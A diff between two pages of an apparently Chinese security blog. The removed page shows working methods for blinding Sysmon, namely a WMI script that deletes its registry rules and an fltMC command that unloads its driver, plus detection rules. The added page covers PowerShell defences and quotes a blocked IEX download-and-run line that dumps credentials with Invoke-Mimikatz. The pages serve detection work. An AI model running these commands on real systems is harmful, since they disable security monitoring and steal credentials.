@@ -6,21 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://www.96007.club">
-  <title>windows常见绕过sysmon的方法 | 12306Bro.blog</title>
+  <title>检测和缓解PowerShell攻击的方法 | 12306Bro.blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="攻击者可能试图阻止由监测软件或进程捕获到的告警，以及事件日志被收集和分析。这可能包括修改配置文件或注册表项中的监测软件的设置，以达到逃避追踪的目的。 在基于特征监测的情况下，攻击者可以阻止监测特征相关的数据被发送出去，以便于阻止安全人员进行分析。这可以有很多方式实现，例如停止负责转发的进程（splunk转发器、Filebate、rsyslog等）。 本文涉及到的方法均为网络公开，仅做测试并提取相关">
-<meta name="keywords" content="终端日志分析,逃避追踪">
+  <meta name="description" content="声明：本文档由12306Bro个人业余时间翻译，个人行为与公司无任何关系！译文来源INSIDER THREAT SECURITY BLOG博客站相关文档。如您对翻译文档内容有异议，请将原文文档做为主要参考，原文版权由博客站及其相关成员持有并保留。翻译文章禁止用于任何商业用途，仅供交流与学习。  PowerShell已经发展成为针对windows系统攻击的主要方式之一，是攻击者使用本机工具攻击的一种">
+<meta name="keywords" content="终端日志分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows常见绕过sysmon的方法">
-<meta property="og:url" content="https://www.96007.club/2019/09/02/T1003-sysmon/index.html">
+<meta property="og:title" content="检测和缓解PowerShell攻击的方法">
+<meta property="og:url" content="https://www.96007.club/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/index.html">
 <meta property="og:site_name" content="12306Bro.blog">
-<meta property="og:description" content="攻击者可能试图阻止由监测软件或进程捕获到的告警，以及事件日志被收集和分析。这可能包括修改配置文件或注册表项中的监测软件的设置，以达到逃避追踪的目的。 在基于特征监测的情况下，攻击者可以阻止监测特征相关的数据被发送出去，以便于阻止安全人员进行分析。这可以有很多方式实现，例如停止负责转发的进程（splunk转发器、Filebate、rsyslog等）。 本文涉及到的方法均为网络公开，仅做测试并提取相关">
+<meta property="og:description" content="声明：本文档由12306Bro个人业余时间翻译，个人行为与公司无任何关系！译文来源INSIDER THREAT SECURITY BLOG博客站相关文档。如您对翻译文档内容有异议，请将原文文档做为主要参考，原文版权由博客站及其相关成员持有并保留。翻译文章禁止用于任何商业用途，仅供交流与学习。  PowerShell已经发展成为针对windows系统攻击的主要方式之一，是攻击者使用本机工具攻击的一种">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-09-05T09:45:50.492Z">
+<meta property="og:updated_time" content="2019-09-26T13:24:33.220Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows常见绕过sysmon的方法">
-<meta name="twitter:description" content="攻击者可能试图阻止由监测软件或进程捕获到的告警，以及事件日志被收集和分析。这可能包括修改配置文件或注册表项中的监测软件的设置，以达到逃避追踪的目的。 在基于特征监测的情况下，攻击者可以阻止监测特征相关的数据被发送出去，以便于阻止安全人员进行分析。这可以有很多方式实现，例如停止负责转发的进程（splunk转发器、Filebate、rsyslog等）。 本文涉及到的方法均为网络公开，仅做测试并提取相关">
+<meta name="twitter:title" content="检测和缓解PowerShell攻击的方法">
+<meta name="twitter:description" content="声明：本文档由12306Bro个人业余时间翻译，个人行为与公司无任何关系！译文来源INSIDER THREAT SECURITY BLOG博客站相关文档。如您对翻译文档内容有异议，请将原文文档做为主要参考，原文版权由博客站及其相关成员持有并保留。翻译文章禁止用于任何商业用途，仅供交流与学习。  PowerShell已经发展成为针对windows系统攻击的主要方式之一，是攻击者使用本机工具攻击的一种">
   
   
     <link rel="icon" href="/favicon.ico">
@@ -178,14 +178,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-T1003-sysmon" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ways-to-detect-and-mitigate-powershell-attacks" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class=" article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      windows常见绕过sysmon的方法
+      检测和缓解PowerShell攻击的方法
     </h1>
   
 
@@ -197,8 +197,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2019/09/02/T1003-sysmon/" class="archive-article-date">
-        <time datetime="2019-09-02T13:54:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-02</time>
+<a href="/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/" class="archive-article-date">
+        <time datetime="2019-09-26T13:18:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-26</time>
 </a>
 
   
@@ -207,44 +207,43 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>攻击者可能试图阻止由监测软件或进程捕获到的告警，以及事件日志被收集和分析。这可能包括修改配置文件或注册表项中的监测软件的设置，以达到逃避追踪的目的。</p>
-<p>在基于特征监测的情况下，攻击者可以阻止监测特征相关的数据被发送出去，以便于阻止安全人员进行分析。这可以有很多方式实现，例如停止负责转发的进程（splunk转发器、Filebate、rsyslog等）。</p>
-<p>本文涉及到的方法均为网络公开，仅做测试并提取相关检测特征。其中直接关闭sysmon服务的方式不建议使用，事件7034未能完整复现，仅供参考。</p>
-<h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><p>众所周知，sysmon可以帮助安全人员记录很多安全事件，目前sysmon最新版本已经是10.X版本。对于攻击者来讲，他们可能需要确定目标主机是否存在sysmon。通常，攻击者是不会去检测他们入侵的主机上是否存在sysmon。</p>
-<p>如何检测被入侵的主机是否存在sysmon，很多攻击者一般执行以下的一种操作：</p>
-<p>枚举进程；</p>
-<p>枚举服务；</p>
-<p>枚举C:\Windows\System32\Drivers下的驱动；</p>
-<p>但是，你应该知道sysmon可以实现以下功能：用户可以在其中更改可执行文件和驱动文件的名称，以便其在系统中的存在进行模糊处理。</p>
-<p>不过攻击者可以利用fltmc.exe查看其altitude号码，sysmon的altitude号码是385201，固定不变的。</p>
-<p>使用fltmc.exe得到的altitude号：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; fltmc.exe</span><br><span class="line"></span><br><span class="line">筛选器名称                      数字实例       高度          框架</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">SysmonDrv                               2       385201         0</span><br><span class="line">luafv                                   1       135000         0</span><br></pre></td></tr></table></figure>
+    <p><strong>声明：本文档由12306Bro个人业余时间翻译，个人行为与公司无任何关系！译文来源<a href="https://blog.stealthbits.com/" target="_blank" rel="noopener">INSIDER THREAT SECURITY BLOG</a>博客站相关文档。如您对翻译文档内容有异议，请将原文文档做为主要参考，原文版权由博客站及其相关成员持有并保留。翻译文章禁止用于任何商业用途，仅供交流与学习。</strong></p>
+<hr>
+<p>PowerShell已经发展成为针对windows系统攻击的主要方式之一，是攻击者使用本机工具攻击的一种方式。对此，我们研究了Empire，DeathStar和CrackMapExec以及这些工具是如何利用PowerShell调用Mimikatz并发起其他攻击的。在本文中，我们讲探讨如何检测和防御PowerShell攻击。</p>
+<h2 id="PowerShell有何优点？"><a href="#PowerShell有何优点？" class="headerlink" title="PowerShell有何优点？"></a>PowerShell有何优点？</h2><p>近些年来，攻击者偏爱PS的原因有很多，比如：</p>
+<ul>
+<li>默认情况下windows系统均有安装；</li>
+<li>它可以从内存执行命令，无需将任何内容写入磁盘，这使得检测起来极其困难；</li>
+<li>它可以启动与其他系统的远程连接；</li>
+<li>GitHub和其他地方（例如Invoke-Mimikatz）上有很多脚本可供攻击者使用；</li>
+<li>管理员也需要使用它，因此几乎完全不会禁用它；</li>
+<li>很难从恶意PowerShell中分辨出正常的PowerShell；</li>
+</ul>
+<p>拥有所有这些好处，作为防御者，我们需要更加重视PowerShell并学习如何保护它。让我们看一些方法。</p>
+<h2 id="约束语言模式"><a href="#约束语言模式" class="headerlink" title="约束语言模式"></a>约束语言模式</h2><p>Windows PowerShell支持各种语言模式。这些语言模式确定可以使用和不能使用PowerShell的哪些部分以及它们如何与Windows交互。针对Surface RT上的Windows RT操作系统开发了约束语言模式。最终，它被添加到Windows PowerShell V5中，并且可以在现代Windows操作系统上使用。</p>
+<p>虽然有多种启用约束语言的方法，例如以允许模式启用AppLocker，但最简单的方法是设置环境变量__ <em>PSLockdownPolicy</em>，这可以通过简单的脚本来完成。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; [Environment]::SetEnvironmentVariable(&apos;__PSLockdownPolicy&apos;,&apos;4&apos;, &apos;Machine&apos;)</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
 
-<p>在Mimikatz中使用misc::mflt命令得到的altitude号：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # misc::mflt</span><br><span class="line">0 2     385201 SysmonDrv</span><br><span class="line">0 1     135000 luafv</span><br></pre></td></tr></table></figure>
+<p>运行脚本后，你可以尝试启动一个新的PowerShell窗口并执行相关命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>
 
-<p>关于更多的如何检测被入侵的主机是否存在sysmon，你可以参考：<a href="https://anquan.baidu.com/article/350，如何检测sysmon不是本文的重点。" target="_blank" rel="noopener">https://anquan.baidu.com/article/350，如何检测sysmon不是本文的重点。</a></p>
-<h3 id="绕过Sysmon的两种方法"><a href="#绕过Sysmon的两种方法" class="headerlink" title="绕过Sysmon的两种方法"></a><strong>绕过Sysmon的两种方法</strong></h3><p>目前，攻击者有2个绕过sysmon的方法，第一个是在利用sysmon进程中的盲点，第二种则是直接禁用sysmon。</p>
-<h4 id="删除配置项"><a href="#删除配置项" class="headerlink" title="删除配置项"></a>删除配置项</h4><p>攻击者可以删除注册表中的规则项，此时， Sysmon在发现注册表被更改后，它将自动重新加载配置。由于此时没有任何安全检测规则存在，它将暂时失去防护能力，不过失效时间，取决于配置的维护方式。如果配置由Ansible，Chef或DSC等配置管理系统管理，可能需要几秒到几分钟才能将配置更改回原始状态，如果使用GPO来管理，那么当GPO更新时，可以在90分钟内恢复原始状态。为了解决这个问题，攻击者可以使用各种Windows技术（如.Net、VBS、PE文件等）创建VMI临时性Consumer监控相应的注册表项，当发现修改操作时，则会删除修改数据或者重新设置表项内容。之所以使用临时的Consumer，是因为大多数防护解决方案会重点关注正在创建或修改的WMI永久事件。</p>
-<h4 id="卸载SysmonDrv驱动"><a href="#卸载SysmonDrv驱动" class="headerlink" title="卸载SysmonDrv驱动"></a>卸载SysmonDrv驱动</h4><p>我们可以采取的另一个操作就是卸载SysmonDrv驱动，该驱动可以为Sysmon提供关于所有磁盘操作的信息，然后将信息写入事件日志中。如前文所述，该驱动有个唯一的altitude编号，如果我们以管理员权限运行，就可以卸载该驱动，然后Sysmon基本上就会完全处于失效状态。我们可以使用<code>fltmc.exe</code>工具来卸载驱动，如下所示，我们通过altitudde编号识别出了隐藏驱动，并成功卸载该驱动。</p>
-<h4 id="关闭sysmon服务（管理员权限）"><a href="#关闭sysmon服务（管理员权限）" class="headerlink" title="关闭sysmon服务（管理员权限）"></a>关闭sysmon服务（管理员权限）</h4><p>通过windows任务管理器，管理员权限关闭sysmon服务。</p>
-<h2 id="检测日志"><a href="#检测日志" class="headerlink" title="检测日志"></a>检测日志</h2><p>sysmon日志、Windows-WMI-Activity日志，system日志</p>
-<h2 id="测试复现"><a href="#测试复现" class="headerlink" title="测试复现"></a>测试复现</h2><h4 id="删除配置项-1"><a href="#删除配置项-1" class="headerlink" title="删除配置项"></a>删除配置项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM RegistryKeyChangeEvent &quot; + </span><br><span class="line">    &quot;WHERE Hive =&apos;HKEY_LOCAL_MACHINE&apos; &quot; + </span><br><span class="line">    &quot;AND KeyPath =&apos;SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters&apos;&quot;</span><br><span class="line"></span><br><span class="line">Register-WMIEvent -Query $query -Action &#123; </span><br><span class="line">    Write-host &quot;Sysmon config updated, deleting config.&quot;</span><br><span class="line">    Remove-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters&quot; -Name &quot;Rules&quot; &#125;</span><br></pre></td></tr></table></figure>
+<p>你可以看到你现在处于“约束语言”模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli&gt; $ExecutionContext.SessionState.LanguageMode</span><br><span class="line">ConstrainedLanguage</span><br><span class="line">PS C:\Users\Xinli&gt;</span><br></pre></td></tr></table></figure>
 
-<p>需要注意一点，此时Sysmon会恢复默认配置，因此会记录进程创建和进程终止事件。</p>
-<h4 id="卸载SysmonDrv驱动-1"><a href="#卸载SysmonDrv驱动-1" class="headerlink" title="卸载SysmonDrv驱动"></a>卸载SysmonDrv驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; fltMC.exe</span><br><span class="line"></span><br><span class="line">筛选器名称                      数字实例       高度          框架</span><br><span class="line">------------------------------  -------------  ------------  -----</span><br><span class="line">SysmonDrv                               2       385201         0</span><br><span class="line">luafv                                   1       135000         0</span><br><span class="line">PS C:\Users\Administrator&gt; fltMC.exe unload SysmonDrv</span><br><span class="line">PS C:\Users\Administrator&gt; fltMC.exe</span><br><span class="line"></span><br><span class="line">筛选器名称                      数字实例       高度          框架</span><br><span class="line">------------------------------  -------------  ------------  -----</span><br><span class="line">luafv                                   1       135000         0</span><br><span class="line">PS C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure>
+<p>启用约束语言模式后，运行诸如Invoke-Mimikatz之类的恶意脚本将不再起作用： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli\Desktop\drunkenkatz&gt; Import-Module .\Invoke-Mimikatz.orig.ps1</span><br><span class="line">Import-Module : 在 ConstrainedLanguage 模式下不允许将 *.ps1 文件作为模块导入。</span><br><span class="line">所在位置 行:1 字符: 1</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Mimikatz.orig.ps1</span><br><span class="line"></span><br><span class="line">CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.Import</span><br><span class="line">ModuleCommand</span><br></pre></td></tr></table></figure>
 
-<h4 id="关闭sysmon服务"><a href="#关闭sysmon服务" class="headerlink" title="关闭sysmon服务"></a>关闭sysmon服务</h4><p>任务管理器&gt;服务&gt;sysmon服务&gt;停止</p>
-<h2 id="测试留痕"><a href="#测试留痕" class="headerlink" title="测试留痕"></a>测试留痕</h2><p>暂无</p>
-<h2 id="检测规则-思路"><a href="#检测规则-思路" class="headerlink" title="检测规则/思路"></a>检测规则/思路</h2><h4 id="删除配置项-2"><a href="#删除配置项-2" class="headerlink" title="删除配置项"></a>删除配置项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">title: 删除sysmon配置项</span><br><span class="line">description: win7 模拟测试结果</span><br><span class="line">status: experimental</span><br><span class="line">author: 12306Bro</span><br><span class="line">logsource:</span><br><span class="line">    product: windows</span><br><span class="line">    service: WMI日志</span><br><span class="line">detection:</span><br><span class="line">    selection:</span><br><span class="line">        EventID: 5860</span><br><span class="line">        keyword: &apos;命名空间 = root\cimv2；NotificationQuery = SELECT * FROM RegistryKeyChangeEvent WHERE Hive =&apos;HKEY_LOCAL_MACHINE&apos; AND KeyPath =&apos;SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters&apos;；PossibleCause = Temporary&apos;</span><br><span class="line">    timeframe: last 1m</span><br><span class="line">    condition: selection</span><br><span class="line">level: medium</span><br></pre></td></tr></table></figure>
+<p>即使使用再狡猾的技术，例如<a href="http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html" target="_blank" rel="noopener">此处</a>描述的从URL下载Invoke- Mimikatz的技术，也将被阻止：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Xinli\Desktop\drunkenkatz&gt; powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br><span class="line">New-Object : 无法创建类型。此语言模式仅支持核心类型。</span><br><span class="line">所在位置 行:1 字符: 6</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); ...</span><br><span class="line"></span><br><span class="line">CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz : 无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括</span><br><span class="line">路径，请确保路径正确，然后再试一次。</span><br><span class="line">所在位置 行:1 字符: 71</span><br><span class="line"></span><br><span class="line">... lient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCr ...</span><br><span class="line"></span><br><span class="line">CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], CommandNotFoundException</span><br><span class="line"></span><br><span class="line">FullyQualifiedErrorId : CommandNotFoundException</span><br></pre></td></tr></table></figure>
 
-<h4 id="卸载SysmonDrv驱动—sysmon"><a href="#卸载SysmonDrv驱动—sysmon" class="headerlink" title="卸载SysmonDrv驱动—sysmon"></a>卸载SysmonDrv驱动—sysmon</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">title: fltmc卸载sysmon</span><br><span class="line">description: windows server 2008 模拟测试结果</span><br><span class="line">status: experimental</span><br><span class="line">author: 12306Bro</span><br><span class="line">logsource:</span><br><span class="line">    product: windows</span><br><span class="line">    service: sysmon</span><br><span class="line">detection:</span><br><span class="line">    selection1:</span><br><span class="line">        EventID: 1</span><br><span class="line">        Image: &apos;C:\Windows\SysWOW64\fltMC.exe&apos;</span><br><span class="line">        CommandLine: &apos;&quot;C:\Windows\system32\fltMC.exe&quot;  unload Sysmon*&apos;</span><br><span class="line">        ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">    selection2:</span><br><span class="line">        EventID: 255</span><br><span class="line">        ID: &apos;DriverCommunication&apos;</span><br><span class="line">        Description: &apos;Failed to retrieve events - Last error: 由于线程退出或应用程序请求，已中止 I/O 操作。&apos;</span><br><span class="line">    timeframe: last 1m</span><br><span class="line">    condition: selection1 and selection2</span><br><span class="line">level: medium</span><br></pre></td></tr></table></figure>
-
-<h4 id="关闭sysmon服务-1"><a href="#关闭sysmon服务-1" class="headerlink" title="关闭sysmon服务"></a>关闭sysmon服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">title: 以其他方式关闭sysmon服务</span><br><span class="line">description: win7 模拟测试结果</span><br><span class="line">status: experimental</span><br><span class="line">author: 12306Bro</span><br><span class="line">logsource:</span><br><span class="line">    product: windows</span><br><span class="line">    service: system、sysmon</span><br><span class="line">detection:</span><br><span class="line">    selection1:</span><br><span class="line">        EventID: 4 #sysmon日志</span><br><span class="line">        State: Stopped</span><br><span class="line">    selection2: 7036 #system日志</span><br><span class="line">        keyword: &apos;Sysmon* 服务处于 停止 状态。&apos;</span><br><span class="line">    selection3: 7040  #system日志</span><br><span class="line">        keyword: &apos;Sysmon64 服务的启动类型从 自动启动 更改为 已禁用。&apos;</span><br><span class="line">    selection4: 7034 #system</span><br><span class="line">    condition: selection or selection2 or selection3 or selection4</span><br><span class="line">level: medium</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考推荐"><a href="#参考推荐" class="headerlink" title="参考推荐"></a>参考推荐</h2><p>MITRE-ATT&amp;CK-T1054：<a href="https://attack.mitre.org/techniques/T1054/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1054/</a></p>
-<p>审核策略相关介绍：<a href="https://www.malwarearchaeology.com/logging" target="_blank" rel="noopener">https://www.malwarearchaeology.com/logging</a></p>
-<p>如何规避sysmon：<a href="https://www.anquanke.com/post/id/161630" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161630</a></p>
+<h2 id="使用AppLocker禁用PowerShell和脚本"><a href="#使用AppLocker禁用PowerShell和脚本" class="headerlink" title="使用AppLocker禁用PowerShell和脚本"></a>使用AppLocker禁用PowerShell和脚本</h2><p>AppLocker随Windows 10 Enterprise一起提供，并提供了一种将应用程序和脚本列入白名单的有用方法。可以在系统上本地配置，也可以通过组策略配置。</p>
+<p>创建AppLocker策略时，可以将它们应用于文件，可执行文件，脚本和打包的应用程序。有关每个方面的详细信息，请<a href="https://technet.microsoft.com/en-us/library/hh831409(v=ws.11).aspx" target="_blank" rel="noopener">参阅TechNet上的有用信息</a>。</p>
+<p>出于安全的目的，你可以使用脚本规则策略，使用简单的PowerShell脚本为指定文件夹创建允许规则。这将确保只能执行此文件夹中的文件。</p>
+<p>您还可以使用可执行规则来限制可以通过文件路径或签名执行的文件。如果为PowerShell和PowerShell_ISE创建签名规则，则可以限制非管理员以这种方式运行PowerShell。应当指出，这很容易被攻击者绕开，因为正如我们在PowerShell Empire工具中看到的那样，可以在没有PowerShell.exe的情况下运行PowerShell。 PowerShell的团队提供了一个关于PowerShell的蓝队手册，请参与<a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/" target="_blank" rel="noopener">这里</a>。</p>
+<h2 id="使用脚本块日志记录检测恶意PowerShell"><a href="#使用脚本块日志记录检测恶意PowerShell" class="headerlink" title="使用脚本块日志记录检测恶意PowerShell"></a>使用脚本块日志记录检测恶意PowerShell</h2><p>PowerShell V5引入了几种跟踪恶意PowerShell的新方法。在这篇文章中重点介绍的是脚本块记录。默认情况下，PowerShell V5会启用此级别的日志记录，并提供由PowerShell执行的完整脚本的明文日志记录。这很有用，因为许多攻击将利用难以破解的编码脚本。</p>
+<p>此处因能力有限，未做复现，大致讲一下思路。即利用Out-EncodedCommand进行Base-64编码并为PowerShell有效负载脚本生成命令行输出。<strong>但是，PowerShell事件日志仍然可以准确地看到我们运行的内容，而无需进行任何编码。</strong> </p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong>原文</strong>检测和缓解PowerShell攻击的方法：<a href="https://blog.stealthbits.com/ways-to-detect-and-mitigate-powershell-attacks" target="_blank" rel="noopener">https://blog.stealthbits.com/ways-to-detect-and-mitigate-powershell-attacks</a></p>
+<p>一句powershell调用mimikatz抓密码：<a href="https://www.waitalone.cn/powershell-mimikatz.html" target="_blank" rel="noopener">https://www.waitalone.cn/powershell-mimikatz.html</a></p>
 
     
 
@@ -259,7 +258,7 @@
           </li>
           <li>
             <strong>本文链接：</strong>
-            <a href="https://www.96007.club/2019/09/02/T1003-sysmon/" title="windows常见绕过sysmon的方法" target="_blank">https://www.96007.club/2019/09/02/T1003-sysmon/</a>
+            <a href="https://www.96007.club/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/" title="检测和缓解PowerShell攻击的方法" target="_blank">https://www.96007.club/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/</a>
           </li>
           <li>
             <strong>版权声明： </strong>
@@ -279,10 +278,6 @@
 			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">终端日志分析</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">逃避追踪</a>
         		</li>
       		
 		</ul>
@@ -349,7 +344,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://www.96007.club/2019/09/02/T1003-sysmon/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://www.96007.club/2019/09/26/ways-to-detect-and-mitigate-powershell-attacks/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -364,18 +359,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/09/11/Credential-Access-win-SAM-mimikatz/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Credential-Access-win-SAM-mimikatz
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/09/02/T1003/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">T1003-windows-基于LSA凭证获取</div>
+    <a href="/2019/09/19/five-challenges-with-monitoring-active-directory-security-using-event-logs/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">使用windows事件日志监控AD安全性的五大挑战</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -530,6 +516,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">凭证获取</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">密码喷射</a>
               </li>
             
             <div class="clearfix"></div>
